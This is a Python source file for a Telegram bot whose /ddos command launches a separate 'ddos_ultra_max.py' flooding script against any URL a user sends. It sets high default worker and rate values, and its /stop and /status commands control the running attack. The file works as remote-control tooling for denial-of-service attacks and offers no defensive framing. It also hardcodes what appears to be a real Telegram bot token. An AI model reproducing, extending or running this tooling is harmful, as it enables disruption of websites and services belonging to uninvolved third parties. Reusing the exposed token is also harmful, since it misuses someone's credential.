import logging
import subprocess
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8623945913:AAFJMhq2azWjvSmr6pNRN_kMNNeSlTXae6E"

attack_process = None
attack_lock = threading.Lock()
attack_running = False

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot ULTRA MAX ready!\n"
        "/ddos <url> [workers] [rate] [duration]\n"
        "/stop\n/status\n/help"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/ddos <url> [workers] [rate] [duration] – start attack\n"
        "/stop – stop\n/status – check\n/help – this"
    )

async def ddos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process, attack_running
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /ddos <url> [workers] [rate] [duration]")
        return
    url = args[0]
    workers = int(args[1]) if len(args) > 1 else 1000
    rate = int(args[2]) if len(args) > 2 else 50000
    duration = int(args[3]) if len(args) > 3 else 60

    with attack_lock:
        if attack_running:
            await update.message.reply_text("⚠️ Attack already running. Use /stop first.")
            return
        cmd = ["python3", "ddos_ultra_max.py", url, "-t", str(workers), "-r", str(rate), "-d", str(duration)]
        try:
            attack_process = subprocess.Popen(cmd)
            attack_running = True
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
            return

    await update.message.reply_text(f"🚀 ULTRA MAX Attack on {url}\nWorkers: {workers}, Rate: {rate}, Duration: {duration}s")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process, attack_running
    with attack_lock:
        if not attack_running or attack_process is None:
            await update.message.reply_text("ℹ️ No attack running.")
            return
        attack_process.terminate()
        attack_process = None
        attack_running = False
    await update.message.reply_text("⏹️ Attack stopped.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with attack_lock:
        if attack_running:
            await update.message.reply_text("🟢 Attack is running.")
        else:
            await update.message.reply_text("🔴 No attack running.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("ddos", ddos))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    print("✅ Bot started. Polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
